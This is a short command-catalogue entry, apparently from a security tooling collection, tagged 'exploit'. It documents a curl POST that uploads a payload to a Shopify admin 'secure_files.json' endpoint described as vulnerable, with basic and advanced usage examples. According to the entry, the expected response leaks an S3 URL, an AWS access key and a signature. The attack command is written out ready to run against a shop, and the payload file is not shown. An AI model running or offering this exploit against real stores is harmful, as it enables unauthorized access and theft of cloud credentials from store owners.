---
data: >-
  curl -X POST -H "Content-Type: application/json" -H "Cookie:
  shop_session=your_session" -d '@payload.json'
  https://your-shop.myshopify.com/admin/secure_files.json
tags:
  - http
  - upload
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.321Z'
id: 3e4a1a63-a11c-4f44-b41c-05e430c50e8b
verified: false
validated: true
submitted: true
---
# curl-upload-signature

## Command

```bash
curl -X POST -H "Content-Type: application/json" -H "Cookie: shop_session=your_session" -d '@payload.json' https://your-shop.myshopify.com/admin/secure_files.json
```

## Description

Sends a POST request to upload a signature file payload to Shopify's vulnerable endpoint using curl, simulating low-privilege exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-H "Cookie: shop_session=your_session"` | Authentication cookie | Yes |
| `-d '@payload.json'` | Payload file | Yes |
| `https://.../secure_files.json` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/json" -H "Cookie: shop_session=abc123" -d '@payload.json' https://shop.myshopify.com/admin/secure_files.json
```

### Advanced Usage

```bash
curl -X POST -H "Authorization: Bearer token" -H "Content-Type: application/json" -d '{"secure_file": {...}}' https://shop.myshopify.com/admin/secure_files.json -v
```

## Expected Output

JSON response with secure_file details: {"secure_file": {"url": "https://s3...", "expires_at": "...", "aws_access_key": "...", "signature": "..."}}

## Related

- [[commands/generate-base64-svg]]
